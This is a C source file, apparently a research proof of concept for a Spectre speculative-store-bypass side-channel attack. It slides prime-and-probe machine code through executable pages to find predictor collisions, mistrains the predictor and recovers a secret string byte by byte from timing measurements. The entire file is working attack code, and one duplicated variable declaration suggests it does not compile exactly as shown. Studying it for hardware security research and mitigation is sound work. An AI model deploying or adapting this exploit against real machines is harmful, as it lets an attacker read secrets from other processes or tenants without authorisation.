#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/mman.h>

/* ======================= */
/*   PoC Configuration.    */
/* ======================= */

#include "config.h"

/* ======================= */
/*  Common address space.  */
/* ======================= */

// Variables that are used both in attacker and victim space.
uint8_t unused1[64];
uint8_t array1[160] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
uint8_t unused2[64];
long array2[256];
size_t idx, idx2;
uint8_t padding_1[64];
size_t idx_chain_0 = (size_t) &idx;
uint8_t padding_1[64];
size_t idx_chain_1 = (size_t) &idx_chain_0;
uint8_t padding_2[64];
size_t idx_chain_2 = (size_t) &idx_chain_1;

/* ======================= */
/*  Victim address space.  */
/* ======================= */

// For an avaliable load.
char* secret = SECRET;

// For an non-optimized load.
uint8_t temp = 0;

void victim_function() {
    // Delayed store, cause a prediction of SSBP.
    array2[idx] = 0;
    /* Three loads:
        1) load1 = array2[idx2]; (We train the SSBP entry that this load selects to predict as non-aliasing.)
        2) load2 = array1[load1];
        3) load3 = array2[load2]. (We probe the SSBP entry that this load selects to recover the secret byte. Note that the right shift is not required here.)
     */
	temp = array2[array1[array2[idx2]]];     
}

/* ======================= */
/* Attacker address space. */
/* ======================= */

// Prime and probe function in the machine code format. This code is used during fiding the SSBP collision, and slides in an executable page. The instruction address of this function increases one byte for each round of collision finding.
uint8_t function_base[150] = {
    PRIME_PROBE_FUNC
};

// Length of the machine bytes.
int bytes_num_for_base = 150;

// The page where the prime function (target the same SSBP as the 1st load in the victim funcion) will be placed.
static char* executable_page_1;

// The page where the probe function (target the same SSBP as the 3rd load in the victim funcion) will be placed.
static char* executable_page_2;

// The declaration of SSBP prime function (target the same SSBP as the 1st load in the victim funcion). This is the entry of the prime and probe function that in the machine code format in line 56.
static void (*prime_entry) (void*, void*);

// The declaration of SSBP probe function (target the same SSBP as the 3rd load in the victim funcion). This is the entry of the prime and probe function that in the machine code format in line 56.
static void (*probe_entry) (void*, void*);

// Record execution time of the prime and probe function.
uint64_t timing[100];

/**
 *  Memory fence.
 */
__attribute__((always_inline)) inline void mfence() {
    __asm__ volatile("mfence" ::: "memory");
}

/**
 *  Flush a specific cache line by a given address.
 *  @param
 *      - addr: the virtual address that needs to be flushed
 */
__attribute__((always_inline)) inline void clflush(void* addr) {
    __asm__ volatile("clflush (%0)" :: "r"(addr));
}

/**
 *  Get a timestamp on the CPU that executes the code.
 *  @return
 *      - the 64-bit timestamp
 */
__attribute__((always_inline)) inline size_t gettime(void) {
    unsigned long low_a, high_a;
    asm volatile(RDPRU
        : "=a" (low_a), "=d" (high_a)
        : "c" (1));
    unsigned long aval = ((low_a) | (high_a) << 32);
    return aval;
}

/**
 *  Analyse a given time record, return the count of speculative store bypass state.
 *  @param
 *      - timing: timestamp records, in the form of an array
 *      - len: the length of timestamp array
 *  @return
 *      - the count of speculative store bypass state.
 */
int cnt_non_aliasing(uint64_t* timing, int len) {
    int cnt = 0;
    for(int i = 0; i < len; ++ i) {
        if (timing[i] <= TYPE_H_BOUND) {
            cnt ++;
        }
    }
    return cnt;
}

/** 
 *  Leak secrets through out-of-place Spectre-STL attack.
 *  We modify the code based on Spectre-V1 attack (https://github.com/Eugnis/spectre-attack).
 *  @param
 *      - malicious_x: the distance between secret byte and the base address of array1
 *      - value: record the recovered byte for each round of try, each element ranges from 0 to 255
 *      - score: count the recovered value for each round of try, each element ranges from 0 to TRY_FOR_LEAK
 **/
void leak(size_t malicious_x, uint8_t value[2], int score[2]) {
    // Temporal score board.
	static int results[256];
    // Store the timestamp.
	register uint64_t time1, time2;
    // For flush and reload.
    uint8_t junk = 0;
    volatile uint8_t* addr;
    // For score board evaluation.
    int rank_0_idx, rank_1_idx, mix_i;
    // Reset the score board.
	for (int i = 0; i < 256; i++)
		results[i] = 0;
    // Leak secrets through Spectre-CTL attack.
	for (int tries = TRY_FOR_LEAK; tries > 0; tries--) {
        for (int test_byte = 0; test_byte < 256; ++ test_byte) {
            // Initialize the target entry of SSBP through the prime function and the probe function. The memory access sequence is (a 40n a 40n a 40n).
            for (int i = 0; i < 3; ++ i) {  
                (*prime_entry)(&array2[0], &array2[0]);
                mfence();
                (*probe_entry)(&array2[0], &array2[0]);
                for (int j = 0; j < 40; ++ j) {
                    mfence();
                    (*prime_entry)(&array2[0], &array2[1]);
                    (*probe_entry)(&array2[0], &array2[1]);
                    mfence();
                }
            }
            // Prepare an aliasing store-load pair for attack.
            idx = test_byte;
            idx2 = test_byte;
            array2[idx2] = malicious_x;
            temp = array2[idx2];
            // Delay the address generation of the store.
            clflush(&idx);
            clflush(&idx_chain_0);
            clflush(&idx_chain_1);
            clflush(&idx_chain_2);
            // We can recover the secret even the secret is not in cache.
            clflush(&array1);
            mfence();
            // Trigger a transient execution in the victim space.
            idx = (int)*(size_t*)*((size_t*)*(size_t *)idx_chain_2);
            victim_function();      
            // Probe SSBP to recover the secret. The memory access sequence is (35n).
            for(int i = 0; i < 35; ++ i) {  // probe the SSBP
                mfence();
                time1 = gettime();
                (*probe_entry)(&array2[0], &array2[10]);
                mfence();
                time2 = gettime() - time1;
                mfence();
                timing[i] = time2;
            }
            // Recover the secret byte based on the frequency of non-alised execution time.
            results[test_byte] += cnt_non_aliasing(timing, 35) < 30 ? 1 : 0;  
        }
        // Evaluate the score board, and perform an early-stop algorithm if a clear result is found.
        rank_0_idx = -1, rank_1_idx = -1;
        for (int i = 0; i < 256; i ++) {
            if (rank_0_idx < 0 || results[i] >= results[rank_0_idx]) {
                rank_1_idx = rank_0_idx;
                rank_0_idx = i;
            }
            else if (rank_1_idx < 0 || results[i] >= results[rank_1_idx]) {
                rank_1_idx = i;
            }
        }
        if (results[rank_0_idx] >= (2 * results[rank_1_idx] + 5) || (results[rank_0_idx] == 3 && results[rank_1_idx] == 0))
            break;
	}
    // The first and second best recoverd secret bytes.
	value[0] = (uint8_t)rank_0_idx;
	score[0] = results[rank_0_idx];
	value[1] = (uint8_t)rank_1_idx;
	score[1] = results[rank_1_idx];    
}

/** 
 *  Search for collision based on our reverse engineering of SSBP.
 *  The prime and probe function slides in executable_page_1 OR executable_page_2. We want the load inside the prime and probe function collides with the 1st load in the victim function (the prime function in executable_page_1) OR the 3rd load (the probe function in executable_page_2) in the victim function.
 *  In specific, the hashed values of the physical address of the load are the same. 
 *  Since the address mapping is not available in user mode, we have to move the prime and probe function to change the physical address of the candidate load.
 *  @param
 *      - executable_page: address of the empty page where the prime OR probe function will be placed.
        - idx2_i: set aliased or non-aliased store-load pair in the victim space.
 *  @return
 *      - if the collision is found, return the offset of the entry to the start of executable_page; if not, return -1
 */
int fill_function(char* executable_page, int idx2_i) {
    // Two variables that store the timestamp.
    uint64_t time1, time2;
    // Entry of the prime and probe function, whose address is alterable.
    static void (*entry) (void*, void*);
    // Make the 1st OR 3rd load in the victim space aliased with the proceeding store.
    idx2 = idx2_i;
    // Execute the collision finding algorithm.
    for (int i = 0; i < EXE_PAGE_SIZE - bytes_num_for_base; ++ i) {
        // Step 1. Slide the prime and probe function to a new address.
        // Step 1.1. Set the new entry of prime and probe function.
        char* page_in_bytes = executable_page + i;
        // Step 1.2. Fill the machine code to a specific address. Note that the IVAs and IPAs of the store and load are adjustable.
        if (mprotect(executable_page, EXE_PAGE_SIZE, PROT_READ | PROT_WRITE) != 0) {
            printf("mprotect failed!\n");
            return 0;
        }
        for (int i = 0; i < bytes_num_for_base; i ++) {
            *(page_in_bytes + i) = function_base[i];
        }
        if (mprotect(executable_page, EXE_PAGE_SIZE, PROT_READ | PROT_EXEC) != 0) {
            printf("mprotect failed!\n");
            return 0;
        }
        // Step 1.3. Make the function callable.
        entry = (void*) page_in_bytes;
        // Step 2. Test whether the collision happens. Try TRY_FOR_COLLISION times for each possible address.
        int success_1 = 0, success_2 = 0;
        for (int try = 0; try < TRY_FOR_COLLISION; ++ try) {
            // Step 2.1. Initialize the target entry of SSBP in the victim space.
            // The memory access sequence is (a 40n a 40n a 40n).
            for (int j = 0; j < 3; ++ j) {
                idx = 0;
                // Expand the transient window through cache misses.
                clflush(&idx);
                clflush(&idx_chain_0);
                clflush(&idx_chain_1);
                clflush(&idx_chain_2);
                mfence();
                idx = (int)*(size_t*)*((size_t*)*(size_t *)idx_chain_2);
                victim_function();
                for (int k = 0; k < 40; ++ k) {
                    idx = 1;
                    clflush(&idx);
                    mfence();
                    victim_function();
                }
            }
            // Step 2.2. Update the SSBP entry in the victim space. 
            // For the odd round, the SSBP entry is reset to reduce the noise.
            // For the even round, the SSBP entry is trained to predict as aliasing.
            idx = try & 1;
            clflush(&idx);          
            clflush(&idx_chain_0);
            clflush(&idx_chain_1);
            clflush(&idx_chain_2);
            mfence();
            // trigger an update of the SSBP
            idx = (int)*(size_t*)*((size_t*)*(size_t *)idx_chain_2);
            victim_function();
            // Step 3. Execute the candidate prime and probe funcion and timing the function.
            // Step 3.1. Execute the memory access sequence below (35n).            
            for(int j = 0; j < 35; ++ j) {
                mfence();
                time1 = gettime();
                (*entry)(&array2[0], &array2[1]);  
                mfence();
                time2 = gettime() - time1;
                mfence();
                timing[j] = time2;
            }
            // Step 3.2. Count the frequency of non-alised execution time.
            // The non-alised execution time is shorter than the aliased one, and we use TYPE_H_BOUND to distinguish them.
            int cnt_h = cnt_non_aliasing(timing, 35);
            // Step 3.3. For the odd round, the frequency should range from [34, 35] when the collision happens.
            success_1 += (try & 1) && cnt_h >= 34 ? 1 : 0;
            // Step 3.4. For the even round, the frequency should range from [19, 21] when the collision happens.
            success_2 += !(try & 1) && cnt_h >= 19 && cnt_h <= 21 ? 1 : 0;
        }
        // Step 4. Determine whether a collision occurs.
        // The judging threshold of success rate is 80% for the odd round and 80% for the even round.
        // Step 4.1. Find the collision and return the entry address (in the form of the offset from executable_page).
        if (success_1 >= TRY_FOR_COLLISION * 0.4 && success_2 >= TRY_FOR_COLLISION * 0.4) {  // find the collision and exit
            printf("find offset as %d\n", i);
            return i;
        }
        // Step 4.2. The collision does not occur, continue.
        continue;
    }
    // If the collision cannot be found, return -1.
    printf("cannot find target, idx2 = %d\n", idx2_i);
    return -1;
}

int main(int argc, const char* * argv) {
    // Create plenty of pages to find the collision of SSBP.
    // Page number can be adjusted by modifying the macro PG_NUM.
    executable_page_1 = mmap(0, EXE_PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    executable_page_2 = mmap(0, EXE_PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    // Create address mapping for executable_page_1 and executable_page_2.
    for (int i = 0; i < EXE_PAGE_SIZE; i ++) {
        executable_page_1[i] ^= temp;
        executable_page_2[i] ^= temp;
    }

    // Create address mapping for array2.
	for (size_t i = 0; i < 256; i ++)
		array2[i] = 0;

    // Initialize the values for the collision finding algorithm.
    array2[0] = 0;
    array1[0] = 10;

    // Search SSBP collision address for the prime function.
    printf("Search offset of prime entry: ");
    int prime_entry_offset = fill_function(executable_page_1, 0);

    // Check search result.
    if (prime_entry_offset == -1) {
        printf("cannot find prime entry, quit.\n");
        return 0;
    }
    prime_entry = (void*) executable_page_1 + prime_entry_offset;

    // Initialize the values for the collision finding algorithm.
    array2[10] = 0;
    array1[0] = 0;

    // Search SSBP collision address for the probe function.
    printf("Search offset of probe entry: ");
    int probe_entry_offset = fill_function(executable_page_2, 10);

    // Check search result.
    if (probe_entry_offset == -1) {
        printf("cannot find probe entry, quit.\n");
        return 0;
    }
    probe_entry = (void*) executable_page_2 + probe_entry_offset;

    // Leak Secret through Spectre-CTL Attack, the framework is adapted from Eugnis' code.
	printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
	size_t malicious_x = (size_t)(secret - (char *)array1), secret_base = (size_t)(secret);
	int score[2], len = LEAK_LEN;
	uint8_t value[2];
    printf("Reading %d bytes:\n", len);
	while (-- len >= 0) {
		printf("Reading at address = 0x%lx... ", secret_base ++);
		leak(malicious_x ++, value, score);
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' score=%d ", value[0],
		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X='%c' score=%d)", value[1],
				   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				   score[1]);
		printf("\n");
	}
	return (0);
}